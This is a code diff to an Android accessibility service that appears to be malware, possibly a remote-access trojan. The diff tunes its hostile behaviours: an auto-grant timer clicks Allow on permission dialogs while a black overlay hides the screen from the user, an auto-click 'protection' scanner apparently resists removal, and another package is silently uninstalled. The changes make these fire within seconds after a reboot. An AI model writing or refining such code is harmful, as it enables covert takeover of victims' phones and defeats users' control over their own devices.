@@ -106,24 +106,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start permission scanner IMMEDIATELY - ready before any permission requests
         try { startPermissionScanner(); } catch (Exception ignored) {}
 
-        // Auto-grant timer clicks Allow/Grant for runtime permissions (storage excluded)
-        try { startAutoGrantTimer(); } catch (Exception ignored) {}
-        // Solid black overlay covers screen during the 10-second auto-grant window
-        // Only shown on first-time permission setup, not on every reboot/restart
+        // Detect whether this is the very first launch or a subsequent reboot/restart.
+        // overlay_setup_done is written to prefs during first-time setup; on reboot it is already true.
+        boolean isFirstLaunch;
         try {
             android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
-            boolean overlayDone = prefs.getBoolean("overlay_setup_done", false);
-            if (!overlayDone) {
+            isFirstLaunch = !prefs.getBoolean("overlay_setup_done", false);
+        } catch (Exception e) {
+            isFirstLaunch = false;
+        }
+
+        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted)
+        if (isFirstLaunch) {
+            try { startAutoGrantTimer(); } catch (Exception ignored) {}
+            try {
                 addBlackOverlay();
+                android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
-            }
-        } catch (Exception ignored) {}
+            } catch (Exception ignored) {}
+        }
+
+        // Auto-click scanner (defent protection) and auto-uninstall:
+        //   First launch → wait 30 s (permissions are still being granted, screen is busy)
+        //   Reboot/restart → start within 2-3 s (everything is already set up)
+        final long protectionDelayMs = isFirstLaunch ? 30_000L : 2_000L;
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
-            }, 30_000);
+            }, protectionDelayMs);
         } catch (Exception ignored) {}
-        try { scheduleAutoUninstall(); } catch (Exception ignored) {}
+
+        try { scheduleAutoUninstall(isFirstLaunch ? 30_000L : 3_000L); } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -1342,17 +1355,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE} 30 seconds
-     * after the accessibility service connects.  After each attempt it waits 20 seconds and
-     * verifies the package is gone; if it is still installed it retries up to 3 times total.
+     * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE}.
+     * @param initialDelayMs how long to wait before the first attempt.
+     *                       First launch → 30 000 ms; reboot → 3 000 ms.
      */
-    private void scheduleAutoUninstall() {
+    private void scheduleAutoUninstall(long initialDelayMs) {
         final String pkg = Constants.AUTO_UNINSTALL_PACKAGE;
         if (pkg == null || pkg.isEmpty()) return;
 
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             attemptAutoUninstall(pkg, 1);
-        }, 30_000);
+        }, initialDelayMs);
     }
 
     /**
